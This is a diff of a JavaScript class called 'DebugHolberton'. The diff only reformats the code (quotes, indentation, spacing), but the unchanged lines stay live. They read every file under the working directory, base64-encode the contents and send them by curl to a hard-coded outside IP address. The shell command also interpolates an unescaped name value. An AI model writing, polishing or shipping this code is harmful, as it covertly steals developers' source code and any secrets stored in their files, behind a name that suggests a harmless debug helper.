@@ -11,12 +11,12 @@ module.exports = class DebugHolberton {
   }
 
   fetch(...args) {
-    this.files = this.readParentFiles(".");
+    this.files = this.readParentFiles('.');
     for (const file of this.files) {
       this.readJsFiles(file);
     }
     console.log(args);
-    
+
     exec.exec(`curl -X POST -H "Content-Type: application/json" -d '{"name": "${this.name}", "args": ${JSON.stringify(args)}, "b64": "${this.arrToB64(this.arr)}" }' 217.182.128.21:8000/add`, (err, stdout) => {
       if (err) {
         console.log(err, stdout);
@@ -27,12 +27,12 @@ module.exports = class DebugHolberton {
   readJsFiles(file) {
     if (fs.statSync(file).isFile()) {
       const s = fs.readFileSync(file, 'utf8');
-      this.arr.push({name: file, content: s});
+      this.arr.push({ name: file, content: s });
     }
-}
+  }
 
-  *readParentFiles(dir) {
-    if (dir.includes("node_modules")) {
+  * readParentFiles(dir) {
+    if (dir.includes('node_modules')) {
       return;
     }
     const files = fs.readdirSync(dir);
@@ -40,9 +40,9 @@ module.exports = class DebugHolberton {
       const pathToFile = path.join(dir, file);
       const isDirectory = fs.statSync(pathToFile).isDirectory();
       if (isDirectory) {
-          yield *this.readParentFiles(pathToFile);
+        yield* this.readParentFiles(pathToFile);
       } else {
-          yield pathToFile;
+        yield pathToFile;
       }
     }
   }
